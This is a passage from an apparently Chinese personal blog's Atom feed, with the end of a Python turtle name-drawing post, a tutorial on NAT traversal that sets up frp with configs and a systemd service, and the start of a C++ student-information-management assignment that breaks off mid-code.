class="number">270</span>, <span class="number">140</span>)</span><br><span class="line">    draw(<span class="number">180</span>, <span class="number">18</span>)</span><br><span class="line">    locate(<span class="number">446</span>, <span class="number">328</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">20</span>)</span><br><span class="line">    locate(<span class="number">414</span>, <span class="number">363</span>)</span><br><span class="line">    draw(<span class="number">0</span>, <span class="number">56</span>)</span><br><span class="line">    locate(<span class="number">446</span>, <span class="number">383</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">34</span>)</span><br><span class="line">    locate(<span class="number">515</span>, <span class="number">286</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">24</span>)</span><br><span class="line">    locate(<span class="number">478</span>, <span class="number">310</span>)</span><br><span class="line">    draw(<span class="number">0</span>, <span class="number">80</span>)</span><br><span class="line">    locate(<span class="number">498</span>, <span class="number">342</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">108</span>)</span><br><span class="line">    draw(<span class="number">180</span>, <span class="number">20</span>)</span><br><span class="line">    locate(<span class="number">498</span>, <span class="number">342</span>)</span><br><span class="line">    draw(<span class="number">0</span>, <span class="number">42</span>)</span><br><span class="line">    draw(<span class="number">270</span>, <span class="number">106</span>)</span><br><span class="line">    draw(<span class="number">0</span>, <span class="number">20</span>)</span><br><span class="line">    hideturtle()</span><br><span class="line">    done()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>面重点来了，字不重要，看图！！！<br><img data-src="https://cdn.file.todest.cn/pic/20200511.png" alt=""></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;今天闲着没事，就用python的turtle库绘制了一下自己的名字（其实是老师留的作业）。&lt;br&gt;咳咳，言归正传，我先网上选了个好看又好画的字体，于是保存下载画图打开，这样我们就有了每个笔画的坐标，接下来就开始操作了（嘻嘻）。&lt;/p&gt;</summary>
    
    
    
    <category term="编程语言" scheme="https://blog.todest.cn/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    <category term="Python" scheme="https://blog.todest.cn/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/Python/"/>
    
    
    <category term="Python" scheme="https://blog.todest.cn/tags/Python/"/>
    
    <category term="turtle" scheme="https://blog.todest.cn/tags/turtle/"/>
    
  </entry>
  
  <entry>
    <title>内网穿透</title>
    <link href="https://blog.todest.cn/post/bd50b816/"/>
    <id>https://blog.todest.cn/post/bd50b816/</id>
    <published>2020-04-08T08:08:24.000Z</published>
    <updated>2020-05-11T09:45:20.552Z</updated>
    
    <content type="html"><![CDATA[<h1 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h1><p>&emsp;&emsp;<strong>端口映射</strong>就是将外网主机的IP地址的一个端口映射到内网中一台机器，提供相应的服务。当用户访问该IP的这个端口时，服务器自动将请求映射到对应局域网内部的机器上。端口映射有动态和静态之分。<br>&emsp;&emsp;通俗来讲，端口映射是将一台主机的内网(LAN)IP地址映射成一个公网(WAN)IP地址，当用户访问提供映射端口主机的某个端口时，服务器将请求转移到本地局域网内部提供这种特定服务的主机；利用端口映射功能还可以将一台外网IP地址机器的多个端口映射到内网不同机器上的不同端口。 端口映射功能还可以完成一些特定代理功能，比如代理POP，SMTP，TELNET等协议。理论上可以提供65535(总端口数)-1024(保留端口数)=64511个端口的映射。</p><p>&emsp;&emsp;<strong>内网穿透</strong>，即NAT穿透，网络连接时术语，计算机是局域网内时，外网与内网的计算机节点需要连接通信，有时就会出现不支持内网穿透。就是说映射端口，能让外网的电脑找到处于内网的电脑，提高下载速度。不管是内网穿透还是其他类型的网络穿透，都是网络穿透的统一方法来研究和解决。</p><a id="more"></a><h1 id="方式"><a href="#方式" class="headerlink" title="方式"></a>方式</h1><h2 id="FRP"><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h2><p>&emsp;&emsp;假如你有一个有公网IP的服务器，并且网速不是太差的话，frp就是一个不错的选择，当然如果没有的话，可以用后面的方法。</p><h3 id="下载frp"><a href="#下载frp" class="headerlink" title="下载frp"></a>下载frp</h3><blockquote><p>frp项目地址：<a href="https://github.com/fatedier/frp">https://github.com/fatedier/frp</a></p></blockquote><p>进入realses界面下载需要的版本，下载完成后分别解压到服务器和客户端上。<br>这里以linux（服务器），windows(客户端)为例。</p><h3 id="linux服务器上配置"><a href="#linux服务器上配置" class="headerlink" title="linux服务器上配置"></a>linux服务器上配置</h3><p>下载并解压文件。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/fatedier/frp/releases/download/v0.29.0/frp_0.29.0_linux_amd64.tar.gz</span><br><span class="line">tar xzvf frp_0.29.0_linux_amd64.tar.gz</span><br><span class="line"><span class="comment"># 可以给文件夹改个短点的名字</span></span><br><span class="line">mv frp_0.29.0_linux_amd64 frp</span><br></pre></td></tr></table></figure><br>配置服务端frp配置文件。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> frp</span><br><span class="line">vim frps.ini</span><br></pre></td></tr></table></figure><br>按 $I$ 键进入插入模式，输入以下内容。<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span>  <span class="comment"># 默认监听端口，为服务器和客户端通信的端口，可以根据实际情况进行更改。</span></span><br><span class="line"><span class="attr">token</span> = <span class="number">12345678</span>  <span class="comment"># 认证秘钥，客户端需与服务端一致才可以连接，可以不写这一行。</span></span><br></pre></td></tr></table></figure><br>按 $Esc$ 退出插入模式，并输入”:wq”保存（w）并退出（q），不包括引号。<br>至此，服务端已配置完毕，接下来运行即可。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.ini <span class="comment"># 运行时需保持终端打开，否则会结束运行。Ctrl+C手动结束运行。</span></span><br><span class="line">nohup ./frps -c frps.ini <span class="comment"># 放到后台运行，服务器重启需重新执行。</span></span><br></pre></td></tr></table></figure><br>以上方式运行未免还是有些不方便，所以最好将其写入到systemd服务。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/systemd/system/frps.service</span><br></pre></td></tr></table></figure><br>写入以下内容。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description&#x3D;frps daemon    # 服务名称，随便填写即可</span><br><span class="line">After&#x3D;syslog.target  network.target</span><br><span class="line">Wants&#x3D;network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type&#x3D;simple</span><br><span class="line">ExecStart&#x3D;&#x2F;root&#x2F;frp&#x2F;frps -c &#x2F;root&#x2F;frp&#x2F;frps.ini   # 修改为你的frps的绝对路径</span><br><span class="line">Restart&#x3D; always</span><br><span class="line">RestartSec&#x3D;1min</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy&#x3D;multi-user.target</span><br></pre></td></tr></table></figure><br>启动服务，并设置开及自动运行。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl daemon-reload        <span class="comment"># 重新加载服务</span></span><br><span class="line">sudo systemctl <span class="built_in">enable</span> frps.service  <span class="comment"># 开机自启</span></span><br><span class="line">sudo systemctl start frps           <span class="comment"># 启动服务</span></span><br></pre></td></tr></table></figure></p><h3 id="windows客户端上配置"><a href="#windows客户端上配置" class="headerlink" title="windows客户端上配置"></a>windows客户端上配置</h3><p>配置客户端frp配置文件，编辑 frpc.ini。<br><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = <span class="number">0.0</span>.<span class="number">0.0</span>  <span class="comment"># 服务器IP地址或域名</span></span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span>     <span class="comment"># 服务器监听端口</span></span><br><span class="line"><span class="attr">token</span> = <span class="number">12345678</span></span><br><span class="line"></span><br><span class="line"><span class="section">[mc]</span>   <span class="comment"># 此处名称随意</span></span><br><span class="line"><span class="attr">type</span> = tcp  <span class="comment"># 协议类型，如udp，http，https，stpx，xtcp</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">25565</span>       <span class="comment"># 本地监听端口</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">25565</span>      <span class="comment"># 服务器转发端口</span></span><br><span class="line"><span class="attr">custom_domains</span> = domain  <span class="comment"># 服务器域名</span></span><br></pre></td></tr></table></figure><br>至此，客户端也配置完毕了，进入到frp文件夹，在此处打开cmd，或powershell。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\frpc -c frpc.ini</span><br></pre></td></tr></table></figure><br>运行以上内容即可，窗口关闭即结束，也可以写入到 run.bat 双击执行。<br>接下来就可以愉快的玩耍了。</p><p><strong>注：详细配置文件参照frps_full.ini和frpc_full.ini</strong></p><h2 id="其他方式"><a href="#其他方式" class="headerlink" title="其他方式"></a>其他方式</h2><h3 id="花生壳"><a href="#花生壳" class="headerlink" title="花生壳"></a>花生壳</h3><blockquote><p>官网：<a href="https://hsk.oray.com">https://hsk.oray.com</a></p></blockquote><p>一次性付费开通服务，1Mbps带宽，每月1G流量。</p><h3 id="蒲公英"><a href="#蒲公英" class="headerlink" title="蒲公英"></a>蒲公英</h3><blockquote><p>官网：<a href="https://pgy.oray.com">https://pgy.oray.com</a></p></blockquote><p>免费，仅限三人互相访问，1Mbps带宽。</p><p><strong>还有其他免费平台自行百度即可，此处就不多赘述。</strong></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;名词解释&quot;&gt;&lt;a href=&quot;#名词解释&quot; class=&quot;headerlink&quot; title=&quot;名词解释&quot;&gt;&lt;/a&gt;名词解释&lt;/h1&gt;&lt;p&gt;&amp;emsp;&amp;emsp;&lt;strong&gt;端口映射&lt;/strong&gt;就是将外网主机的IP地址的一个端口映射到内网中一台机器，提供相应的服务。当用户访问该IP的这个端口时，服务器自动将请求映射到对应局域网内部的机器上。端口映射有动态和静态之分。&lt;br&gt;&amp;emsp;&amp;emsp;通俗来讲，端口映射是将一台主机的内网(LAN)IP地址映射成一个公网(WAN)IP地址，当用户访问提供映射端口主机的某个端口时，服务器将请求转移到本地局域网内部提供这种特定服务的主机；利用端口映射功能还可以将一台外网IP地址机器的多个端口映射到内网不同机器上的不同端口。 端口映射功能还可以完成一些特定代理功能，比如代理POP，SMTP，TELNET等协议。理论上可以提供65535(总端口数)-1024(保留端口数)=64511个端口的映射。&lt;/p&gt;
&lt;p&gt;&amp;emsp;&amp;emsp;&lt;strong&gt;内网穿透&lt;/strong&gt;，即NAT穿透，网络连接时术语，计算机是局域网内时，外网与内网的计算机节点需要连接通信，有时就会出现不支持内网穿透。就是说映射端口，能让外网的电脑找到处于内网的电脑，提高下载速度。不管是内网穿透还是其他类型的网络穿透，都是网络穿透的统一方法来研究和解决。&lt;/p&gt;</summary>
    
    
    
    <category term="计算机网络" scheme="https://blog.todest.cn/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
    
    <category term="端口映射" scheme="https://blog.todest.cn/tags/%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84/"/>
    
  </entry>
  
  <entry>
    <title>学生信息管理系统</title>
    <link href="https://blog.todest.cn/post/36af3259/"/>
    <id>https://blog.todest.cn/post/36af3259/</id>
    <published>2020-04-08T08:08:24.000Z</published>
    <updated>2020-05-11T09:46:11.408Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>C++课程作业</p></blockquote><a id="more"></a><p><strong>非文件操作:</strong><br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> K=<span class="number">0</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">STU</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    ll Num;</span><br><span class="line">    <span class="keyword">char</span> Name[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">char</span> Sex;</span><br><span class="line">    <span class="keyword">double</span> Score;</span><br><span class="line">    <span class="keyword">bool</span> flag;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">TITLE_STU</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">ADD_STU</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">CHANGE_STU</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">DEL_STU</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">SHOW_STU</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">SORT_STU</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">MAX_STU</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">friend</span> <span class="keyword">bool</span> <span class="title">CMP</span><span class="params">(STU,STU)</span></span>;</span><br><span class="line">    STU()</span><br><span class="line">    &#123;</span><br><span class="line">        flag=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ~STU()&#123;&#125;</span><br><span class="line">&#125;Boy[<span class="number">1000</span>];</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">CMP</span><span class="params">(STU a,STU b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a.Score == b.Score)</span><br><span class="line"><span class="keyword">return</span> a.Num&lt;b.Num;</span><br><span class="line"><span class="keyword">return</span> a.Score&gt;b.Score;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">STU::TITLE_STU</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;\t1:\tADD A STUDENT&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;\t2:\tCHANGE STUDENTS\&#x27;S INFORMATION&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;\t3:\tDELETE A STUDENT&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;\t4:\tSHOW STUDENTS INFORMATION&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;\t5:\tSORT BY SCORE&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;\t6:\tSHOW THE MAX SCORE\&#x27; STUDENT&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;\t0:\tEXIT THE STUDENTS INFORMATION MANAGE SYSTEM&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="string">&quot;\tPLEASE ENTER SELECTED CHOICES FROM ABOVE LISTS&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">STU::ADD_STU</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;请输入要添加的学生人数&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">int</span> T;<span class="built_in">cin</span>&gt;&gt;T;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;请输入&quot;</span>&lt;&lt;T&lt;&lt;<span class="string">&quot;行学生的学号,姓名,性别,成绩&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;T;i++,K++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;Boy[K].Num&gt;&gt;Boy[K].Name&gt;&gt;Boy[K].Sex&gt;&gt;Boy[K].Score;</span><br><span class="line">        Boy[K].flag=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="string">&quot;学生信息导入成功&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">STU::CHANGE_STU</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;请输入要修改的学生学号,输入0停止删除&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    ll num;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;num)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;K;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(num==Boy[i].Num)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;请再次输入学生的学号,姓名,性别,成绩&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                <span class="built_in">cin</span>&gt;&gt;Boy[i].Num&gt;&gt;Boy[i].Name&gt;&gt;Boy[i].Sex&gt;&gt;Boy[i].Score;</span><br><span class="line">                Boy[i].flag=<span class="number">0</span>;</span><br><span class="line">                flag=<span class="number">1</span>;</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;学生信息修改成功&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(num==<span class="number">0</span>)<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span>(flag==<span class="number">0</span>)<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;NO SUCH STUDENTS&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">STU::DEL_STU</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;请输入要删除的学生学号,输入0停止删除&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    ll num;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;num)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> flag=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;K;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(num==Boy[i].Num)</span><br><span class="line">            &#123;</span><br><span class="line">                Boy[i].flag=<span class="number">1</span>;</span><br><span class="line">                flag=<span class="number">1</span>;</span><br><span class="line">                <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;DELETE SUCCESS!&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(num==<span class="number">0</span>)<span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span>(flag==<span class="number">0</span>)<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;NO SUCH STUDENTS&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">STU::SHOW_STU</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;<span class="string">&quot;\tThe Lists Of Students Are Here&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;-----------------------------------------------&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;    学号\t姓名\t\t性别\t成绩&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;-----------------------------------------------&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>.setf(<span class="built_in">std</span>::ios::left);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;K;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(Boy[i].flag==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;Boy[i].Num&lt;&lt;<span class="string">&#x27;\t&#x27;</span>;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;setw(<span class="number">8</span>)&lt;&lt;Boy[i].Name;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;\t &quot;</span>&lt;&lt;Boy[i].Sex&lt;&lt;<span class="string">&#x27;\t&#x27;</span>;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;setiosflags(ios::fixed)&lt;&lt;setprecision(<span class="number">2</span>)&lt;&lt;Boy[i].Score&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;-----------------------------------------------&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">STU::SORT_STU</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    sort(Boy,Boy+K,CMP);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;学生信息排序成功&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">STU::MAX_STU</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> Maxn=<span class="number">0</span>,Flag=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;K;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(Boy[i].Score&gt;=Boy[Maxn].Score)</span><br><span class="line">        &#123;</span><br><span class="line">            Maxn=i;</span><br><span class="line">            Flag=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(Flag==<span class="number">0</span>)<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;NO STUDENT&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;-----------------------------------------------&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;    学号\t姓名\t\t性别\t成绩&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span 